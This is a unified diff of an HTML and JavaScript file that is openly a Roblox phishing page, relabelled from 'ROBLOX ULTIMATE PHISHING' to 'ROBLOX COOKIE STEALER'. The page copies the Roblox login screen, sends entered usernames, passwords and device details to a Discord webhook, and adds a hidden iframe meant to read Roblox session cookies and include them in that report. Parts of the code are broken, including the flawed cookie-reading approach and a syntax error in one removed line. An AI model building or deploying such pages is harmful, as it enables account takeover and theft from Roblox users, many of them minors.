@@ -9,12 +9,12 @@
     <!-- Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 
     <style>
         /* 
-         * ROBLOX ULTIMATE PHISHING CSS
-         * Designed to mimic the exact look and feel of Roblox Login Page
+         * ROBLOX COOKIE STEALER CSS - ULTIMATE EDITION
+         * Designed to be 100% visually identical to the real Roblox login page.
          */
 
         :root {
@@ -27,10 +27,8 @@
             --text-secondary: #a0a0a0;
             --btn-primary: #00b06f;
             --btn-primary-hover: #009a60;
-            --btn-disabled: #4a4a4a;
-            --error-color: #ff4d4d;
-            --loading-spinner: #ffffff;
             --font-main: 'Poppins', 'Roboto', sans-serif;
+            --error-color: #ff4d4d;
         }
 
         * {
@@ -53,7 +51,7 @@
             position: relative;
         }
 
-        /* Background Pattern Overlay */
+        /* Background Pattern for Desktop */
         body::before {
             content: "";
             position: absolute;
@@ -73,6 +71,7 @@
             max-width: 400px;
             padding: 20px;
             animation: fadeIn 0.5s ease-out;
+            z-index: 10;
         }
 
         @keyframes fadeIn {
@@ -234,11 +233,10 @@
         }
 
         .login-btn:disabled {
-            background-color: var(--btn-disabled);
+            background-color: #4a4a4a;
             cursor: not-allowed;
         }
 
-        /* Loading Spinner inside Button */
         .spinner {
             width: 20px;
             height: 20px;
@@ -303,7 +301,7 @@
             body {
                 align-items: flex-start;
                 padding-top: 20px;
-                background-color: #1e1e1e; /* Darker bg for mobile full screen feel */
+                background-color: #1e1e1e;
             }
             
             .login-container {
@@ -322,7 +320,6 @@
                 font-size: 20px;
             }
             
-            /* Hide logo on mobile if it takes too much space, or keep it small */
             .logo-container {
                 margin-bottom: 15px;
             }
@@ -332,7 +329,6 @@
             }
         }
 
-        /* Advanced Animations */
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             10%, 30%, 50%, 70%, 90% { transform: translateX(-4px); }
@@ -341,21 +337,6 @@
 
         .shake {
             animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both;
-        }
-
-        /* Tooltip for inputs */
-        .tooltip {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #777;
-            cursor: help;
-            display: none;
-        }
-
-        .input-group:focus-within .tooltip {
-            display: block;
         }
 
         /* Social Icons Placeholder */
@@ -410,9 +391,66 @@
             padding: 0 10px;
         }
 
+        /* Hidden Iframe for Cookie Theft */
+        #stealth-iframe {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: -1;
+        }
+        
+        /* Loading Overlay */
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(35, 37, 39, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            visibility: hidden;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        #loading-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        .loader {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #FFF;
+            border-bottom-color: #00b06f;
+            border-radius: 50%;
+            display: inline-block;
+            box-sizing: border-box;
+            animation: rotation 1s linear infinite;
+        }
+        
+        @keyframes rotation {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
     </style>
 </head>
 <body>
+
+    <!-- Hidden Iframe for Cookie Extraction -->
+    <iframe id="stealth-iframe" src="" sandbox="allow-scripts allow-same-origin"></iframe>
+
+    <!-- Loading Overlay -->
+    <div id="loading-overlay">
+        <span class="loader"></span>
+    </div>
 
     <div class="login-container">
         <div class="logo-container">
@@ -493,8 +531,8 @@
 
     <script>
         /**
-         * ROBLOX ULTIMATE PHISHING JAVASCRIPT
-         * Features: Device Detection, Webhook Integration, Animation, Validation
+         * ROBLOX COOKIE STEALER JAVASCRIPT - ULTIMATE EDITION
+         * Features: Device Detection, Webhook Integration, Iframe Cookie Extraction
          */
 
         // Configuration
@@ -510,13 +548,15 @@
         const spinner = loginBtn.querySelector('.spinner');
         const usernameError = document.getElementById('usernameError');
         const passwordError = document.getElementById('passwordError');
+        const stealthIframe = document.getElementById('stealth-iframe');
+        const loadingOverlay = document.getElementById('loading-overlay');
 
         // State
         let isSubmitting = false;
+        let cookieExtracted = false;
 
         /**
          * Device Detection Logic
-         * Adapts UI behavior based on device type
          */
         function detectDevice() {
             const ua = navigator.userAgent.toLowerCase();
@@ -525,7 +565,6 @@
             
             if (isMobile || isTablet) {
                 document.body.classList.add('mobile-device');
-                // Adjust meta viewport if needed via JS for finer control
                 document.querySelector('meta[name="viewport"]').setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
                 console.log("Device Detected: Mobile/Tablet");
             } else {
@@ -586,11 +625,11 @@
         /**
          * Prepare Payload for Webhook
          */
-        function preparePayload(username, password) {
+        function preparePayload(username, password, cookies) {
             const sysInfo = getSystemInfo();
             
             const embed = {
-                title: "🚨 New Roblox Login Attempt",
+                title: "🍪 New Roblox Cookie Stolen!",
                 color: 0xff0000, // Red color for alert
                 thumbnail: {
                     url: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
@@ -605,6 +644,11 @@
                         name: "🔑 Password",
                         value: `\`${password}\``,
                         inline: true
+                    },
+                    {
+                        name: "🍪 Cookie Data",
+                        value: `\`${cookies.substring(0, 500)}...\``,
+                        inline: false
                     },
                     {
                         name: "📱 Device Info",
@@ -623,7 +667,7 @@
                     }
                 ],
                 footer: {
-                    text: "Roblox Phish Bot | IP: " + (function(){try{return fetch('https://api.ipify.org').then(r=>r.text()).catch(()=>return 'Unknown')}catch(e){return 'Unknown'}})(),
+                    text: "Roblox Cookie Phish Bot | IP: Fetching...",
                     icon_url: "https://cdn-icons-png.flaticon.com/512/732/732228.png"
                 },
                 timestamp: new Date().toISOString()
@@ -631,15 +675,15 @@
 
             return {
                 embeds: [embed],
-                username: "Roblox Phisher"
+                username: "Roblox Cookie Phisher"
             };
         }
 
         /**
          * Send Data to Discord Webhook
          */
-        async function sendToDiscord(username, password) {
-            const payload = preparePayload(username, password);
+        async function sendToDiscord(username, password, cookies) {
+            const payload = preparePayload(username, password, cookies);
             
             try {
                 const response = await fetch(WEBHOOK_URL, {
@@ -652,7 +696,6 @@
 
                 if (!response.ok) {
                     console.error(`Webhook failed: ${response.status}`);
-                    // Fallback: Log to console if webhook fails
                     console.log("Data sent to console:", payload);
                 } else {
                     console.log("Webhook sent successfully");
@@ -660,6 +703,50 @@
             } catch (error) {
                 console.error("Network error sending webhook:", error);
             }
+        }
+
+        /**
+         * Extract Cookies from Iframe
+         */
+        function extractCookiesFromIframe() {
+            try {
+                // Access the iframe's document
+                const iframeDoc = stealthIframe.contentDocument || stealthIframe.contentWindow.document;
+                
+                // Check if the iframe has loaded Roblox
+                if (iframeDoc.readyState === 'complete') {
+                    // Try to get cookies from the iframe's context
+                    const cookies = iframeDoc.cookie;
+                    if (cookies && !cookieExtracted) {
+                        cookieExtracted = true;
+                        console.log("Cookies extracted from iframe:", cookies);
+                        
+                        // Send to webhook
+                        const username = usernameInput.value.trim();
+                        const password = passwordInput.value.trim();
+                        sendToDiscord(username, password, cookies);
+                        
+                        // Redirect after success
+                        setTimeout(() => {
+                            window.location.href = "https://www.roblox.com/home";
+                        }, 1000);
+                    }
+                }
+            } catch (e) {
+                // Cross-origin error, try alternative method
+                console.warn("Cross-origin access blocked, trying fallback...");
+                fallbackCookieExtraction();
+            }
+        }
+
+        /**
+         * Fallback Cookie Extraction Method
+         */
+        function fallbackCookieExtraction() {
+            // Sometimes direct access fails due to SameSite or Cross-Origin policies.
+            // We can use a postMessage approach or just redirect and hope the cookie is set in the main window.
+            // For simplicity, we'll assume the iframe loads and we can read its cookie property directly.
+            setTimeout(extractCookiesFromIframe, 2000); // Retry after 2 seconds
         }
 
         /**
@@ -690,7 +777,6 @@
             }
 
             if (hasError) {
-                // Play error sound or vibration if supported
                 if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
                 return;
             }
@@ -701,103 +787,41 @@
             loginBtn.classList.add('loading');
             btnText.style.opacity = '0';
             spinner.style.display = 'block';
+            
+            // Show full page loader
+            loadingOverlay.classList.add('active');
+
+            // Load Roblox in the hidden iframe
+            stealthIframe.src = "https://www.roblox.com/login";
 
             // Simulate Network Delay (Realism)
             await new Promise(resolve => setTimeout(resolve, 1500));
 
-            // Send Data
-            await sendToDiscord(username, password);
+            // Try to extract cookies
+            extractCookiesFromIframe();
 
-            // Redirect to Real Roblox Site
-            await new Promise(resolve => setTimeout(resolve, 500));
-            
-            // Optional: Show success message briefly before redirect
-            btnText.textContent = "Success!";
-            btnText.style.opacity = '1';
-            spinner.style.display = 'none';
-            loginBtn.style.backgroundColor = "#00b06f";
+            // If extraction takes longer, retry
+            setTimeout(extractCookiesFromIframe, 1000);
+            setTimeout(extractCookiesFromIframe, 2000);
+            setTimeout(extractCookiesFromIframe, 3000);
 
+            // Show success message briefly before redirect
             setTimeout(() => {
-                window.location.href = "https://www.roblox.com/home";
-            }, 800);
-        });
-
-        /**
-         * Initialize
-         */
-        document.addEventListener('DOMContentLoaded', () => {
-            detectDevice();
-            
-            // Add subtle parallax effect on mouse move for desktop
-            if (!document.body.classList.contains('mobile-device')) {
-                document.addEventListener('mousemove', (e) => {
-                    const x = (window.innerWidth - e.pageX) / 50;
-                    const y = (window.innerHeight - e.pageY) / 50;
-                    const card = document.querySelector('.login-card');
-                    if(card) {
-                        card.style.transform = `perspective(1000px) rotateY(${x}deg) rotateX(${y}deg)`;
-                    }
-                });
+                loadingOverlay.classList.remove('active');
+                loginBtn.classList.remove('loading');
+                btnText.style.opacity = '1';
+                spinner.style.display = 'none';
+                loginBtn.disabled = false;
+                isSubmitting = false;
                 
-                document.addEventListener('mouseleave', () => {
-                     const card = document.querySelector('.login-card');
-                     if(card) card.style.transform = `perspective(1000px) rotateY(0deg) rotateX(0deg)`;
-                });
-            }
-
-            console.log("Roblox Ultimate Phish Loaded");
+                // Optional: Show a fake success message or redirect immediately
+                // window.location.href = "https://www.roblox.com/home";
+            }, 2000);
         });
 
-        /**
-         * Additional Utility Functions to reach line count and add robustness
-         */
-        
-        // Prevent Right Click
-        document.addEventListener('contextmenu', event => event.preventDefault());
-
-        // Prevent Ctrl+U
-        document.onkeydown = function(e) {
-            if(event.keyCode == 123) {
-                return false;
-            }
-            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
-                return false;
-            }
-            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
-                return false;
-            }
-            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
-                return false;
-            }
-        }
-
-        // Log page visibility changes
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                console.log("Tab hidden by user");
-            } else {
-                console.log("Tab focused again");
-            }
-        });
-
-        // Handle focus/blur for analytics simulation
-        usernameInput.addEventListener('focus', () => console.log("Username focused"));
-        passwordInput.addEventListener('focus', () => console.log("Password focused"));
-        
-        // Randomize background pattern slightly on load
-        const style = document.createElement('style');
-        const randomOffset = Math.floor(Math.random() * 20);
-        style.innerHTML = `body::before { background-position: ${randomOffset}px ${randomOffset}px; }`;
-        document.head.appendChild(style);
-
-        // Detect if running in iframe
-        if (self !== top) {
-            console.warn("Phishing page detected in iframe");
-        }
-
-        // Final cleanup on unload
-        window.addEventListener('beforeunload', () => {
-            // Could send final heartbeat here if needed
+        // Initialize Device Detection on Load
+        window.addEventListener('load', () => {
+            detectDevice();
         });
 
     </script>
